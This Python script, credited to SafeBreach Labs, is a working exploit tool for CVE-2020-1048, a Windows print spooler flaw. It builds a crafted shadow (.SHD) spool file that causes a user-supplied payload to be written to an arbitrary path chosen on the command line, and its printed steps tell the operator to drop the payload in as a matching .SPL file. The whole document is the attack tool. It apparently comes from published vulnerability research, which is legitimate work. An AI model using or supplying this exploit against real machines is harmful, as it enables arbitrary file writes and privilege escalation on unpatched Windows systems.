"""
Author: Peleg Hadar, SafeBreach Labs
Date: February 2020
2020 (C)
"""

import sys
import struct
import argparse

from ShadowFile64 import ShadowFilePayload64
from ShadowFile32 import ShadowFilePayload32

def _convert_string_to_utf16(s):
    return bytes(s.encode('utf-16-le') + b'\x00\x00')

def parse_args():
    parser = argparse.ArgumentParser(description='SHD Writer for CVE-2020-1048')
    
    parser.add_argument('--arch', '-a', help='Architecture: 32 or 64', action="store")
    parser.add_argument('--filePath', '-f', help='The path of the payload to be written', action="store")
    parser.add_argument('--printerName', '-p', help='The virtual printer name', action="store")
    parser.add_argument('--driverName', '-d', help='We used "MS Publisher Color Printer"', action="store")
    parser.add_argument('--writePath', '-w', help='The arbitrary path which the payload will be written to', action="store")
    parser.add_argument('--winMajorVer', '-m', help='Windows major version (10 or 7)', action="store")

    return parser.parse_args()


def main():

    args = parse_args()

    
    with open(args.filePath, "rb") as payloadFile:
        data = payloadFile.read()
    
    print('[+] Opened payload file successfully')
    payloadSize = len(data)
    print('[+] Payload size is: {}'.format(hex(payloadSize)))

    jobId = 12 # Not really important

    shdName = '{}.SHD'.format(str(jobId).zfill(5))
    splName = '{}.SPL'.format(str(jobId).zfill(5))

    print('[+] Creating SHD file')
    print ('[+] {}'.format(args.writePath))

    ShadowFilePayload = None
    if args.arch == '64':
        ShadowFilePayload = ShadowFilePayload64
    elif args.arch == '32':
        ShadowFilePayload = ShadowFilePayload32
    else:
        raise ValueError("Architecture is not supported! Use only 32 or 64.")

    shd = ShadowFilePayload(
        int(args.winMajorVer),
        jobId,
        payloadSize,
        _convert_string_to_utf16(args.printerName),
        _convert_string_to_utf16(args.driverName),
        _convert_string_to_utf16(args.writePath))
    shd.build_file()
    shd.write_shd(shdName)
    print('[*] File created successfuly: {}'.format(shdName))
    print('[*] Copy your payload file as: {}, along with the generated SHD file'.format(splName))
    print('[+] Goodbye...')
    

if __name__ == '__main__':
    main()